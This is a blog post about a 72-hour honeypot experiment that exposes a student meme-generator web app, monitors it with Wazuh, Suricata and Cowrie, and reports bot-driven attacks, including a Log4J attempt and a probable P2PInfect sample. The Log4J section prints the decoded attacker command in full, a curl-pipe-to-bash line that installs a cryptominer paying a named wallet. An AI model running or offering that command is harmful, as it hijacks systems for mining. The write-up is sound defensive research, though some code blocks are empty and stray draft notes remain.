## Blog Post Title: From First Header

During the Christmas holiday, I was reviewing my Github account and found a funny web application that I developed for a university course. It's a Meme Generator, which obviously allows users to view community-created memes and, if registered, to create their own.

Being an introductory course on web application development, security was unfortunately out of scope. I started thinking about what could happen if I exposed the app on the Internet. Would hackers be interested in breaking it? Could they do that? Would they even find it in the first place? Let's find out.

Besides the application, I needed:
- A way to understand if something strange was happening on my web server.
- To know what kind of requests it was receiving.
- Software to centralize all this information.

I discovered that Wazuh could satisfy both points 1 and 3. Wazuh is an open-source XDR and SIEM solution, meaning the agent can monitor the endpoint where the application is hosted and detect any malicious actions; moreover, the SIEM can collect telemetry data for future analysis.

For point 2, I decided to use Suricata, an IDS/IPS solution, to help me understand if any strange requests were hitting the server. Finally, I forwarded Suricata alerts to the Wazuh SIEM.

I hadn't planned to use an SSH honeypot initially, but after some trials, I thought it might be a good idea to make the server more attractive to the bad guys. After trying several open-source projects, I settled on Cowrie.

(All artifacts and tool configurations can be found in the repo: [Honeypot Results](https://github.com/lorenzodegiorgi/Honeypot-Results.git))

### Infrastructure Design
I used a cloud provider to set up 2 VMs: the first hosted the web server and was equipped with a Wazuh agent to monitor the system. Suricata was also installed to alert if the web server received weird content. This VM is Internet-facing.

The second VM hosts the Wazuh console, allowing me to check alerts and collect logs sent by the web server. It is not Internet-facing.

Communications between the VMs were filtered by the cloud provider's firewall, which only permitted the web server to communicate with the Wazuh console. This was to prevent an attacker from also reaching my central console.

### Web-app Setup
The application is straightforward. It was written mainly in JavaScript, using a Node.js server with Express.js.

### Wazuh Setup
For this test, I deployed a Wazuh agent on the web server and the Wazuh console. Essentially, the agent monitors the hosts for suspicious actions and sends notifications to the console. Wazuh offers various features to detect malicious actions, but it needs proper configuration.

Among the different features that can be enabled on Wazuh, I decided to try out the following:
1. File Integrity Monitoring: This feature checks certain folders/files for changes. It's useful to determine if sensitive folders have been compromised. In addition to common folders (/usr, /bin, /etc), I also included the folder where Cowrie drops files downloaded by users connected via SSH.
2. Integration with VirusTotal: I used the API key provided with a free account to connect Wazuh with VirusTotal. This feature allows for the automatic scanning of monitored folders once a change occurs.
3. Enable hidden process detection: This detects hidden processes created by rootkits.

Additionally, I decided to send logs from additional sources to the SIEM:
1. access.log: Logs from the ExpressJS server. Here, I decided to raise the priority of default rules to be alerted on every request against the server.
2. cowrie.log: Logs from the honeypot. Since I wanted to be notified of every suspicious command or login attempt, I examined some log entries and constructed a couple of rules in Wazuh to alert me whenever a login attempt or any command was executed.
3. eve.log: Logs from Suricata. The alerts from Suricata are automatically sent to the dashboard's alerts thanks to predefined rules.

Finally, every configuration was set to just monitor and alert, avoiding blocking malicious actions: in fact, I wanted to see how far an attacker could go with the web server configurations.
The configuration is far from exhaustive, but I thought it was enough to understand if any malicious actions were occurring.

### Suricata Setup
I installed Suricata on the server, which raises an alert (then forwarded to Wazuh SIEM) based on a predefined set of rules. I decided to use the "Emerging Threats" ruleset ([Emerging Threats](https://community.emergingthreats.net)) as recommended by many.

### SSH Honeypot Setup
Cowrie is a medium to high interaction SSH honeypot designed to emulate UNIX systems and log every action. It's written in Python and offers more features than those I tried (for example, it's also a Telnet honeypot).
Although it works well "out-of-the-box," allowing actions to be logged and files dropped in the fake system to be retrieved, I found the documentation a bit lacking and unclear on some topics.
Cowrie is available in a dockerized version, which makes it even easier to use. After running the container and forwarding the traffic, it immediately starts logging.
I set it up to allow login with any username/password after a few login attempts.

### Results
After setting everything up, it was time to run it and wait for results. I ran it for about 72 hours.
Despite expecting more interactions with the application, some strange requests and commands were launched against the server. I believe most of them were conducted by automated bots, but I'm quite happy with that anyway.

#### Some General Statistics
Below are some statistics collected:

#### Interesting Traffic Classification by Suricata
{% include image.html url="/img/2024-01-09-Wazuh-and-Honeypot/suricata.png" description="Suricata traffic classification" %}

I find some classes interesting:
- Attempted Administrator Privilege Gain. From Suricata, it seems to be alerting against CVE_2018_11776. Details here: https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776
- Attempted User Privilege Gain. Even if detection is different, it seems to have the same aim (la prima appartiene a questo ruleset https://github.com/jpalanco/alienvault-ossim/blob/master/snort-rules-default-open/rules/2.9.2/emerging.rules/emerging-exploit.rules)

#### Cryptominer via Log4J attack
There's has been also an attempt to drop a cryptominer via Log4J attack. On Christmas day, I receive the following request against the web server: (interessante sapere se è stato rilevato da Suricata, anche se encoded)

```

```
Decoding base64 string, I got:


```
curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 486xqw7ysXdKw7RkVzT5tdSiDtE6soxUdYaGaGE1GoaCdvBF7rVg5oMXL9pFx3rB1WUCZrJvd6AHMFWipeYt5eFNUx9pmGN
```


(https://blog.criminalip.io/2022/02/11/criminal-ip-analysis-report-on-log4j-attack-patterns/)

"Unfortunately", I didn't use log4j and the attack didn't go well. Anyway, from the decoding string, it is possible to notice that the aim of the attack is to download "xmrig_setup", an opensource miner, and sent crypto to the attacker's wallet.

#### Malware (P2PInfect?)
As soon as I was loosing any hope to get something interesting, a curl command was launch in the honeypot:

```

The first thing that caught my eye was the redundancy of the script trying to download the file with "curl", "wget" and using lower-level methods: likely to overcome the difficulty of finding the tool on the system or avoid detections.
After downloading the script, it writes the string "password" in a file under /tmp and executes the script with the argument

```

```

I'm not quite familiar with malware analysis, but I was very curious to understand what the script does.
First thing, I decided to use "Hybrid Analysis" to get some clues. The results can be found here: Hybrid Analysis Sample. The list of MITRE ATT&CK techniques recognized are briefly:

- T1106: Adversaries interact with native OS.
- T1027: Obfuscated File or Information: section header missing, binary statically linked.
- T1497: Sandbox evasion.
- T1480: Execution Guardrails.
- T1018: Attempt to get a listing of other systems.
- T1003.008: Credential Access.
- T1071: Attempt to communicate.
- T1573: Employ encryption algorithm.

Ok, it may be useful but it's still unclear the final goal of the script.

I used the "readelf" utility to get some static properties of the files but it seems to be statically linked and stripped; it may not be as informative as I thought.
In addition, a further scan with VirusTotal seems to categorize it as a "P2PInfect" malware: in a few words, it's a malware that exploits a Redis vulnerability and then drops executables needed to join the host on a P2P network. Once joined, additional payloads are downloaded based on OS. (Here's a good explanation from Palo Alto Unit42: Peer-to-Peer Worm P2PInfect).
Out of curiosity, I set up new VMs to investigate a little further and I started tracing out syscall with "strace" (full output on Github). There are tons of suspicious calls like reading "/etc/shadow" and "/etc/passwd" or opening new connections.
About connections, looking at firewall logs (every inbound/outbound connection was blocked), I noticed that it started contacting different IP addresses (maybe other P2P nodes as the Unit 42 article states).

After some research, I decided that this work requires tons of time and ability, therefore I'll write a new post with a proper analysis.

#### Unknown Malware
Someone attempted to drop a suspicious bash script on the server, via a strange request to the webserver (likely, trying to exploit some vulnerable app). Unfortunately, I have not had the time to do even basic analysis on it yet. Anyway, it is possible to find it in the repository cited previously.

#### Conclusions
At the beginning, I had in mind different scenarios in which hackers would try to break my applications and reach the database. Instead, I got a lot of likely bot-driven traffic and hacking attempts. At the end, it's also true that no hackers would have spent a lot of time breaking an application which probably doesn't worth it.
Also, running the VMs for just 3 days didn't help.
Anyway, I'm quite satisfied with the results, especially with the probable "P2PInfect" malware which I look forward to analyzing. I'm quite sure that it's possible to find out something more, digging in the logs. Moreover, I really appreciate having the chance to use Wazuh which I had wanted to try for months.
